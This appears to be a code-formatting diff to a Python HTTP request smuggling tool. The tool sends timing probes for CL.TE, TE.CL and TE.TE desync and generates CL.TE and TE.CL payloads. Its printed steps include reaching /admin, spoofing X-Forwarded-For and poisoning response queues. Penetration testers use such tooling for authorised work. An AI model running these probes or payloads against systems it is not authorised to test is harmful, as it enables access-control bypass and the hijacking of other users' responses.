@@ -8,7 +8,7 @@ for CL.TE, TE.CL, TE.TE, and H2C smuggling attacks.
 import json
 import socket
 import time
-from typing import Dict, List, Optional, Tuple
+from typing import List, Optional, Tuple
 
 import requests
 
@@ -100,6 +100,7 @@ class HttpSmugglingProbeTool:
     def _parse_url(self, url: str) -> Tuple[str, str, int, str, bool]:
         """Parse URL into (scheme, host, port, path, use_ssl)."""
         from urllib.parse import urlparse
+
         parsed = urlparse(url)
         scheme = parsed.scheme or "http"
         host = parsed.hostname or "localhost"
@@ -109,7 +110,14 @@ class HttpSmugglingProbeTool:
         path = parsed.path or "/"
         return scheme, host, port, path, use_ssl
 
-    def _send_raw(self, host: str, port: int, raw_request: bytes, use_ssl: bool, timeout: float = 10.0) -> Tuple[str, float]:
+    def _send_raw(
+        self,
+        host: str,
+        port: int,
+        raw_request: bytes,
+        use_ssl: bool,
+        timeout: float = 10.0,
+    ) -> Tuple[str, float]:
         """Send a raw HTTP request and return (response_text, elapsed_time)."""
         start = time.time()
         try:
@@ -117,6 +125,7 @@ class HttpSmugglingProbeTool:
             sock.settimeout(timeout)
             if use_ssl:
                 import ssl
+
                 context = ssl.create_default_context()
                 context.check_hostname = False
                 context.verify_mode = ssl.CERT_NONE
@@ -174,7 +183,9 @@ class HttpSmugglingProbeTool:
             "Connection: close\r\n"
             "\r\n"
         ).encode()
-        normal_response, normal_elapsed = self._send_raw(host, port, normal_request, use_ssl, timeout)
+        normal_response, normal_elapsed = self._send_raw(
+            host, port, normal_request, use_ssl, timeout
+        )
 
         lines.append("=== CL.TE Test ===")
         lines.append(f"Normal request time: {normal_elapsed:.3f}s")
@@ -188,7 +199,9 @@ class HttpSmugglingProbeTool:
             is_vulnerable = True
             lines.append("[+] POTENTIAL CL.TE SMUGGLING DETECTED!")
             lines.append("    Significant timing difference suggests the back-end")
-            lines.append("    processed Transfer-Encoding while the front-end used Content-Length.")
+            lines.append(
+                "    processed Transfer-Encoding while the front-end used Content-Length."
+            )
         elif "400" in response[:50] or "error" in response[:200].lower():
             lines.append("[?] Back-end returned error - may indicate TE processing.")
             lines.append(f"    Response start: {response[:100]}")
@@ -235,7 +248,9 @@ class HttpSmugglingProbeTool:
             "Connection: close\r\n"
             "\r\n"
         ).encode()
-        normal_response, normal_elapsed = self._send_raw(host, port, normal_request, use_ssl, timeout)
+        normal_response, normal_elapsed = self._send_raw(
+            host, port, normal_request, use_ssl, timeout
+        )
 
         lines.append("=== TE.CL Test ===")
         lines.append(f"Normal request time: {normal_elapsed:.3f}s")
@@ -248,7 +263,9 @@ class HttpSmugglingProbeTool:
             is_vulnerable = True
             lines.append("[+] POTENTIAL TE.CL SMUGGLING DETECTED!")
             lines.append("    Significant timing difference suggests the front-end")
-            lines.append("    processed Transfer-Encoding while the back-end used Content-Length.")
+            lines.append(
+                "    processed Transfer-Encoding while the back-end used Content-Length."
+            )
         elif "400" in response[:50] or "error" in response[:200].lower():
             lines.append("[?] Error response - may indicate differential parsing.")
             lines.append(f"    Response start: {response[:100]}")
@@ -299,7 +316,9 @@ class HttpSmugglingProbeTool:
                 "Q\r\n"
             ).encode()
 
-            response, elapsed = self._send_raw(host, port, raw_request, use_ssl, timeout)
+            response, elapsed = self._send_raw(
+                host, port, raw_request, use_ssl, timeout
+            )
 
             result = {
                 "variant": description,
@@ -312,7 +331,9 @@ class HttpSmugglingProbeTool:
             if elapsed > normal_elapsed + 3.0:
                 result["status"] = "POTENTIAL"
                 findings.append(result)
-                lines.append(f"[+] {description}: {elapsed:.3f}s (diff: {elapsed - normal_elapsed:.3f}s) -> POTENTIAL")
+                lines.append(
+                    f"[+] {description}: {elapsed:.3f}s (diff: {elapsed - normal_elapsed:.3f}s) -> POTENTIAL"
+                )
             elif "400" in response[:20]:
                 result["status"] = "ERROR"
                 lines.append(f"[?] {description}: Error response (400)")
@@ -374,9 +395,15 @@ class HttpSmugglingProbeTool:
             lines.append(f"[!] Potential smuggling detected: {', '.join(detected)}")
             lines.append("")
             lines.append("NEXT STEPS:")
-            lines.append("1. Use 'payload' operation with the detected type to generate a smuggling request")
-            lines.append("2. Try smuggling a request to /admin or other restricted paths")
-            lines.append("3. Try smuggling with internal headers (X-Forwarded-For: 127.0.0.1)")
+            lines.append(
+                "1. Use 'payload' operation with the detected type to generate a smuggling request"
+            )
+            lines.append(
+                "2. Try smuggling a request to /admin or other restricted paths"
+            )
+            lines.append(
+                "3. Try smuggling with internal headers (X-Forwarded-For: 127.0.0.1)"
+            )
             lines.append("4. Check for response queue poisoning")
         else:
             lines.append("[-] No smuggling detected with standard probes.")
@@ -393,7 +420,9 @@ class HttpSmugglingProbeTool:
         """Generate a smuggling payload for a confirmed vulnerability type."""
         smuggle_type = (data.get("type") or "").strip().lower()
         url = (data.get("url") or "").strip()
-        smuggled_request = data.get("smuggled_request", "GET /admin HTTP/1.1\r\nHost: localhost\r\n\r\n")
+        smuggled_request = data.get(
+            "smuggled_request", "GET /admin HTTP/1.1\r\nHost: localhost\r\n\r\n"
+        )
 
         if smuggle_type not in ("clte", "tecl"):
             return (
@@ -418,11 +447,7 @@ class HttpSmugglingProbeTool:
             # We set CL to cover the first chunk, but TE chunked body contains the smuggled request
             smuggled_bytes = smuggled_request.encode()
             chunk_size = len(smuggled_bytes)
-            body = (
-                f"0\r\n"
-                f"\r\n"
-                f"{smuggled_request}"
-            )
+            body = f"0\r\n" f"\r\n" f"{smuggled_request}"
             content_length = len("0\r\n\r\n")  # CL covers just the "0\r\n\r\n" part
 
             payload = (
@@ -436,9 +461,15 @@ class HttpSmugglingProbeTool:
             )
 
             lines.append("=== CL.TE Payload ===")
-            lines.append("Front-end reads Content-Length bytes, passes rest to back-end.")
-            lines.append("Back-end sees chunked encoding, processes chunk 0 (end), then")
-            lines.append("treats the smuggled request as the start of the next request.")
+            lines.append(
+                "Front-end reads Content-Length bytes, passes rest to back-end."
+            )
+            lines.append(
+                "Back-end sees chunked encoding, processes chunk 0 (end), then"
+            )
+            lines.append(
+                "treats the smuggled request as the start of the next request."
+            )
             lines.append("")
             lines.append(payload)
 
@@ -447,12 +478,7 @@ class HttpSmugglingProbeTool:
             smuggled_bytes = smuggled_request.encode()
             # Chunk the smuggled request
             hex_len = hex(len(smuggled_bytes))[2:]
-            body = (
-                f"{hex_len}\r\n"
-                f"{smuggled_request}\r\n"
-                f"0\r\n"
-                f"\r\n"
-            )
+            body = f"{hex_len}\r\n" f"{smuggled_request}\r\n" f"0\r\n" f"\r\n"
             # CL is set shorter than the full chunked body
             content_length = len(smuggled_bytes) + len(hex_len) + 2  # partial
 
@@ -467,7 +493,9 @@ class HttpSmugglingProbeTool:
             )
 
             lines.append("=== TE.CL Payload ===")
-            lines.append("Front-end processes Transfer-Encoding (chunked), passes to back-end.")
+            lines.append(
+                "Front-end processes Transfer-Encoding (chunked), passes to back-end."
+            )
             lines.append("Back-end uses Content-Length, reads only part of the body,")
             lines.append("leaving the smuggled request for the next connection.")
             lines.append("")
@@ -485,9 +513,15 @@ class HttpSmugglingProbeTool:
         lines.append("by speaking HTTP/2 directly to the back-end.")
         lines.append("")
         lines.append("USAGE:")
-        lines.append("1. Send this payload via raw socket (not through requests library)")
-        lines.append("2. Monitor subsequent responses for the smuggled request's response")
+        lines.append(
+            "1. Send this payload via raw socket (not through requests library)"
+        )
+        lines.append(
+            "2. Monitor subsequent responses for the smuggled request's response"
+        )
         lines.append("3. For response queue poisoning, send then make a normal request")
-        lines.append("4. The normal request should receive the smuggled request's response")
+        lines.append(
+            "4. The normal request should receive the smuggled request's response"
+        )
 
         return "\n".join(lines)
